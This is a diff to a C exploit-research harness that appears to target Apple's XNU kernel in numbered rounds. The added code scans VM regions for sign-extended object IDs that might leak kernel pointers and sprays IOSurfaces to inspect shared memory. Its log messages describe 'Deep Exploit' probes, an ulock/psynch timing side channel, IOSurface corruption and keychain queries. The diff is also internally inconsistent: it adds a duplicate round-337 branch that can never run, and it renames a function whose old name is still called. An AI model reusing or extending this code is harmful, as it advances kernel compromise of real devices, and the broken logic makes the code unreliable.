+    fflush(stdout);
+
+    rlog("\n--- Part 2: scan ALL regions with extended info + object names ---\n");
+    fflush(stdout);
+    {
+        uint64_t addr = 0;
+        uint64_t size = 0;
+        int region_count = 0;
+        int obj_port_count = 0;
+        int high_ref_count = 0;
+
+        while (region_count < 2000) {
+            vm_region_extended_info_data_t ext;
+            mach_msg_type_number_t cnt = VM_REGION_EXTENDED_INFO_COUNT;
+            mach_port_t obj_name = MACH_PORT_NULL;
+
+            kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &size,
+                VM_REGION_EXTENDED_INFO, (vm_region_info_t)&ext, &cnt, &obj_name);
+            if (kr != KERN_SUCCESS) break;
+
+            if (obj_name != MACH_PORT_NULL) {
+                rlog("  !!! OBJ_PORT 0x%llx-0x%llx port=0x%x tag=%d share=%d ref=%d\n",
+                     (unsigned long long)addr, (unsigned long long)(addr+size),
+                     obj_name, ext.user_tag, ext.share_mode, ext.ref_count);
+                obj_port_count++;
+            }
+
+            /* Look for interesting patterns */
+            if (ext.ref_count > 100) {
+                rlog("  HIGH_REF 0x%llx-0x%llx ref=%d tag=%d share=%d\n",
+                     (unsigned long long)addr, (unsigned long long)(addr+size),
+                     ext.ref_count, ext.user_tag, ext.share_mode);
+                high_ref_count++;
+            }
+
+            addr += size;
+            region_count++;
+        }
+        rlog("  Scanned %d regions, %d with obj_port, %d high_ref\n",
+             region_count, obj_port_count, high_ref_count);
+    }
+    fflush(stdout);
+
+    rlog("\n--- Part 3: vm_region_recurse full depth with 64-bit detail ---\n");
+    fflush(stdout);
+    {
+        uint64_t addr = 0;
+        uint64_t size = 0;
+        int region_count = 0;
+        int kptr_candidates = 0;
+
+        while (region_count < 500) {
+            vm_region_submap_info_data_64_t info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            uint32_t depth = 0;
+
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
+                &addr, &size, &depth, (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+
+            /* dump full struct for shared regions */
+            if (info.share_mode == SM_TRUESHARED || info.share_mode == SM_SHARED_ALIASED ||
+                info.user_tag >= 30) {
+                rlog("  0x%llx sz=0x%llx tag=%d share=%d depth=%d obj=%d(%x)\n",
+                     (unsigned long long)addr, (unsigned long long)size,
+                     info.user_tag, info.share_mode, depth,
+                     info.object_id, info.object_id);
+
+                /* try deeper nesting */
+                uint64_t inner_addr = addr;
+                uint64_t inner_size = size;
+                uint32_t inner_depth = 1;
+                vm_region_submap_info_data_64_t inner;
+                mach_msg_type_number_t icnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kr = mach_vm_region_recurse(mach_task_self(),
+                    &inner_addr, &inner_size, &inner_depth,
+                    (vm_region_recurse_info_t)&inner, &icnt);
+                if (kr == KERN_SUCCESS && inner.object_id != info.object_id) {
+                    rlog("    depth1: obj=%d(%x) share=%d\n",
+                         inner.object_id, inner.object_id, inner.share_mode);
+                }
+            }
+
+            /* cast object_id to check if sign-extension reveals kptr */
+            int32_t signed_id = (int32_t)info.object_id;
+            if (signed_id < 0) {
+                uint64_t extended = (uint64_t)(int64_t)signed_id;
+                if (extended > 0xffff000000000000ULL) {
+                    rlog("  !!! SIGN-EXT KPTR: id=%d -> 0x%llx at 0x%llx\n",
+                         signed_id, (unsigned long long)extended,
+                         (unsigned long long)addr);
+                    kptr_candidates++;
+                }
+            }
+
+            addr += size;
+            region_count++;
+        }
+        rlog("  Scanned %d regions, %d sign-ext kptr candidates\n",
+             region_count, kptr_candidates);
+    }
+    fflush(stdout);
+
+    rlog("\n--- Part 4: IOSurface shared memory vm_region analysis ---\n");
+    fflush(stdout);
+    {
+        /* create IOSurfaces and check their vm_region info */
+        int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef fn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), fn);
+
+        #define R335_SPRAY 8
+        IOSurfaceRef surfs[R335_SPRAY];
+        for (int i = 0; i < R335_SPRAY; i++) {
+            surfs[i] = IOSurfaceCreate(props);
+            if (!surfs[i]) { rlog("  surf %d failed\n", i); continue; }
+
+            void *base = IOSurfaceGetBaseAddress(surfs[i]);
+            if (!base) { IOSurfaceLock(surfs[i], 0, NULL); base = IOSurfaceGetBaseAddress(surfs[i]); IOSurfaceUnlock(surfs[i], 0, NULL); }
+
+            if (base) {
+                uint64_t base_addr = (uint64_t)base;
+                uint64_t raddr = base_addr;
+                uint64_t rsize = 0;
+                vm_region_extended_info_data_t ext;
+                mach_msg_type_number_t cnt = VM_REGION_EXTENDED_INFO_COUNT;
+                mach_port_t obj_name = MACH_PORT_NULL;
+
+                kern_return_t kr = mach_vm_region(mach_task_self(), &raddr, &rsize,
+                    VM_REGION_EXTENDED_INFO, (vm_region_info_t)&ext, &cnt, &obj_name);
+                rlog("  surf[%d] base=0x%llx region=0x%llx-0x%llx tag=%d share=%d ref=%d obj=0x%x\n",
+                     i, (unsigned long long)base_addr,
+                     (unsigned long long)raddr, (unsigned long long)(raddr+rsize),
+                     ext.user_tag, ext.share_mode, ext.ref_count, obj_name);
+
+                /* also check the submap info */
+                uint64_t saddr = base_addr;
+                uint64_t ssize = 0;
+                uint32_t sdepth = 0;
+                vm_region_submap_info_data_64_t sinfo;
+                mach_msg_type_number_t scnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kr = mach_vm_region_recurse(mach_task_self(),
+                    &saddr, &ssize, &sdepth, (vm_region_recurse_info_t)&sinfo, &scnt);
+                if (kr == 0) {
+                    rlog("    submap: obj_id=%d(0x%x) share=%d depth=%d\n",
+                         sinfo.object_id, sinfo.object_id, sinfo.share_mode, sdepth);
+                }
+            }
+        }
+
+        for (int i = 0; i < R335_SPRAY; i++) if (surfs[i]) CFRelease(surfs[i]);
+        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(fn);
+        #undef R335_SPRAY
+    }
+    fflush(stdout);
+
+    rlog("\n=== r335 complete ===\n");
+    fflush(stdout);
+}
+
 /* r332: XPC-based service probing + containermanagerd/installd reply capture
    r331: securityd/trustd accept all MIG IDs (one-way), rpc crashes.
    Try XPC API for proper bidirectional communication + probe services
    that r327 found reachable: containermanagerd, installd, fairplayd */
 
-static void r332_probe(void) {
+static void r332_xpc_probe(void) {
     rlog("\n=== r332: XPC Service Probe + Reply Capture ===\n");
     rlog("  r331: securityd/trustd 40/40 send OK, rpc crashes.\n");
     rlog("  Strategy: XPC API, probe reply-capable services.\n\n");
@@ -44378,6 +45240,20 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 337) {
+            rlog("*** rounds=337: vm_region Object ID Deep Exploit ***\n");
+            rlog("  r334: found high/negative object_ids in vm_region.\n");
+            rlog("  Probe: all flavors, full 64-bit obj ptrs, IOSurface regions.\n\n");
+            r335_probe();
+            goto done;
+        }
+        if (rounds == 337) {
+            rlog("*** rounds=337: KernelSnitch-Adapted XNU Hash Table Timing ***\n");
+            rlog("  Based on: Maar et al. NDSS 2025, CVE-2026-43754 (macOS)\n");
+            rlog("  Probe: ulock timing, psynch, os_sync, Mach trap speculative timing.\n\n");
+            r335_kernelsnitch_probe();
+            goto done;
+        }
         if (rounds == 336) {
             rlog("*** rounds=336: IOKit Object Exploitation + Keychain Query ***\n");
             rlog("  r333: IOKit notifs matched real objects. XPC trustd=empty.\n");
@@ -44407,9 +45283,9 @@ new_modes:
             goto done;
         }
         if (rounds == 332) {
-            rlog("*** rounds=332: XPC Service Probe + Reply Capture ***\n");
-            rlog("  r331: securityd/trustd 40/40 send OK, rpc crashes.\n");
-            rlog("  Probe: XPC API, security entitlements, IOKit notifs, proc_info.\n\n");
+            rlog("*** rounds=332: AVE Crash Boundary + IOSurface Corruption ***\n");
+            rlog("  r331: lid=0x1,0x2 survive 350enc, lid=0x3 CRASHES.\n");
+            rlog("  Probe: Scan crash boundary, spray IOSurfaces, check corruption.\n\n");
             r332_probe();
             goto done;
         }
